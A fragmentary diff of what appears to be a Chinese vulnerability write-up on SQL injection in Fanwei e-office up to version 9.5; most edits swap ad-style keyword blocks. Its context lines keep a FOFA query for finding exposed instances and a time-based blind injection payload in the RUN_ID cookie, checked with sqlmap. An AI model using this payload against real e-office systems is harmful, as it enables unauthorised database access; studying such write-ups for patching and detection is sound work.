@@ -14,6 +14,14 @@ asset_dir: embedded-base64
 
 e-office <=9.5
 
+深入探索
+
+网络安全
+
+VPN
+
+开放源代码
+
 # fofa语句
 
 > `app="泛微-EOffice"`
@@ -37,11 +45,11 @@ $res = exequery( $connection, $sql );
 
 深入探索
 
-计算机安全
+计算机服务器
 
-商务软件和生产力软件
+开发工具
 
-业务流程
+网络监控与管理
 
 `RUN_ID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
@@ -58,6 +66,14 @@ Cookie: RUN_ID=1 AND 9814=BENCHMARK(5000000,MD5(0x55615462))
 成功在延时 5 秒
 
 软件
+
+深入探索
+
+vpn
+
+Linux
+
+网络浏览器
 
 [sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
 
